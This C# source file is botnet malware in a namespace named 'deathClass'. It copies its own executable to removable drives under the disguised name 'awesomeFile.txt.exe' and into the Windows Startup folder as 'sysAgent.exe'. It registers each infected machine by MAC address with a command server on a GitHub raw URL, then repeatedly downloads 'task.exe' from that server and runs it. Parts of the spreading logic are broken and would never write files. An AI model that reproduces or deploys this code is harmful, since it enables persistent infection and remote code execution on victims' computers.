﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Reflection;
using System.Net.NetworkInformation;
using System.Diagnostics;
using System.Threading;

namespace deathClass
{

    class PayLoad
    {

        private static byte[] App;
        public PayLoad()
        {
            App = File.ReadAllBytes(Assembly.GetEntryAssembly().Location);
        }

        public void ExecuteEverything()
        {
            try
            {
                if (Environment.CurrentDirectory.IndexOf(@"Startup") > -1)
                {
                    WriteToDrives(App, "awesomeFile.txt.exe");
                    BotNet payload = new BotNet(GetMACAddress());
                    payload.CheckBotNet();
                }
                else
                {
                    WriteToDrives(App, "awesomeFile.txt.exe");
                    WriteToStartup(App, "sysAgent.exe");
                    Environment.Exit(0);
                }
            }
            catch
            {

            }
        }

        private string GetMACAddress()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String sMacAddress = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (sMacAddress == String.Empty)
                {
                    IPInterfaceProperties properties = adapter.GetIPProperties();
                    sMacAddress = adapter.GetPhysicalAddress().ToString();
                }
            }
            return sMacAddress;
        }

        private void InitializeBotNet()
        {
            try
            {
                BotNet botnet = new BotNet(GetMACAddress());
            }
            catch
            {

            }
        }

        private void WriteToDrives(byte[] FileToWrite, string Name)
        {
            string[] Drives = Environment.GetLogicalDrives();
            foreach (string Drive in Drives)
            {
                if (Drive.IndexOf("C") < -1)
                {
                    try
                    {

                    }
                    catch
                    {
                        File.WriteAllBytes(Drive + Name, FileToWrite);
                    }
                }
            }
        }

        private void WriteToStartup(byte[] FileToWrite, string Name)
        {
            try
            {
                File.WriteAllBytes(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup), Name), FileToWrite);
            }
            catch
            {

            }
        }
    }

    class BotNet
    {
        private string MacAddress;
        private string domain = "https://raw.githubusercontent.com/martia86/potential-potato/main/";
        public BotNet(string Address)
        {
            MacAddress = Address;
            try
            {
                RunTask();
            }
            catch
            {

            }
        }

        public bool RegisterUser()
        {
            WebClient registrar = new WebClient();
            string result = registrar.DownloadString(new Uri(domain + "register.php?MAC=" + MacAddress));
            if (result == "success")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public bool checkForRegistry()
        {
            WebClient checker = new WebClient();
            string result = checker.DownloadString(new Uri(domain + "check.php?MAC=" + MacAddress));
            if (result == "yes")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public void RunTask()
        {
            if (CheckBotNet() == true)
            {
                WebClient payloadDownloader = new WebClient();
                byte[] task = payloadDownloader.DownloadData(new Uri(domain + "task.exe"));
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "task.exe");
                File.WriteAllBytes(filePath, task);
                Process runningTask = Process.Start(filePath);
                runningTask.WaitForExit();
                RunTask();
            }
            else
            {
                int time = 60000 / 2;
                Thread.Sleep(time);
                RunTask();
            }
        }

        public bool CheckBotNet()
        {
            WebClient statusChecker = new WebClient();
            string botnetStatus = statusChecker.DownloadString(new Uri(domain + "status.txt"));

            if (botnetStatus == "ON")
            {
                return true;
            }
            else
            {
                return false;
            }
        }
    }
}